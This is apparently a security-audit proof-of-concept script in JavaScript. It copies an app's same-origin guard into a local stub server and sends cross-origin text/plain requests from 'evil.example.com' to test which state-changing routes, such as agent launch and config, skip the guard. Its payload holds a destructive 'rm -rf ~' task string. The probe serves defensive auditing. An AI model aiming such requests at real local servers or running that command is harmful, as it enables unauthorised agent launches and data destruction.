import { createServer } from 'node:http';

// Faithfully replicate application.ts request dispatch guard (lines ~1558-1581)
// and readBody (1453-1461) to test which state-changing routes enforce
// the same-origin/content-type guard.

async function readRawBody(req, maximum = 2_000_000) {
  const chunks = []; let size = 0;
  for await (const c of req) { const chunk = Buffer.from(c); size += chunk.length; if (size > maximum) throw new Error('413'); chunks.push(chunk); }
  return Buffer.concat(chunks);
}
async function readBody(req, maximum) {
  const raw = await readRawBody(req, maximum);
  if (!raw.length) return null;
  try { return JSON.parse(raw.toString('utf8')); } catch { return null; }
}

// Stub of handleApi: only records that a state-changing route was REACHED.
const reached = [];
async function handleApi(method, path, query, body) {
  if (path === '/api/agents/launch' && method === 'POST') { reached.push({ path, body }); return { status: 200, json: { launched: true, body } }; }
  if (path === '/api/config' && method === 'PUT') { reached.push({ path, body }); return { status: 200, json: { ok: true } }; }
  if (path === '/api/run-commands/x' && method === 'POST') { reached.push({ path, body }); return { status: 200, json: { ok: true } }; }
  return null;
}

const PORT = 18787;
const server = createServer((req, res) => {
  void (async () => {
    const url = new URL(req.url ?? '/', `http://localhost:${PORT}`);
    const hasBody = req.method === 'POST' || req.method === 'PUT';
    const body = hasBody ? await readBody(req) : null;
    // EXACT guard from application.ts:1570-1573
    if ((url.pathname.startsWith('/api/run-commands') || url.pathname.startsWith('/api/source-commands') || url.pathname.startsWith('/api/pull-request-command') || url.pathname.startsWith('/api/communication') || url.pathname.startsWith('/api/terminal/') || url.pathname.startsWith('/api/campaign-service/') || url.pathname.startsWith('/api/local-git/') || url.pathname.startsWith('/api/jira-settings') || url.pathname.startsWith('/api/github-settings') || url.pathname.startsWith('/api/todo-legacy-recovery') || url.pathname.startsWith('/api/source-admin')) && req.method === 'POST'
      && (req.headers['content-type']?.split(';')[0] !== 'application/json'
        || req.headers.origin && req.headers.origin !== `http://${req.headers.host}`)) {
      res.writeHead(403, { 'Content-Type': 'application/json' }); res.end(JSON.stringify({ error: 'blocked' })); return;
    }
    const api = await handleApi(req.method ?? 'GET', url.pathname, url.searchParams, body);
    if (api) { res.writeHead(api.status, { 'Content-Type': 'application/json' }); res.end(JSON.stringify(api.json)); return; }
    res.writeHead(404); res.end('nf');
  })();
});

await new Promise(r => server.listen(PORT, '127.0.0.1', r));

async function attack(path, method, ct) {
  const res = await fetch(`http://127.0.0.1:${PORT}${path}`, {
    method,
    headers: { 'Content-Type': ct, 'Origin': 'http://evil.example.com' },
    body: JSON.stringify({ mode: 'freeform', repo: 'victim/repo', task: 'rm -rf ~ (attacker)', key: 'X', value: 'Y' }),
  });
  return { status: res.status, body: await res.text() };
}

console.log('--- Cross-origin (Origin: evil), Content-Type: text/plain (CORS simple request, no preflight) ---');
console.log('POST /api/agents/launch :', JSON.stringify(await attack('/api/agents/launch', 'POST', 'text/plain')));
console.log('PUT  /api/config        :', JSON.stringify(await attack('/api/config', 'PUT', 'text/plain')));
console.log('POST /api/run-commands/x:', JSON.stringify(await attack('/api/run-commands/x', 'POST', 'text/plain')));
console.log('reached state-changing handlers:', JSON.stringify(reached.map(r => r.path)));
server.close();
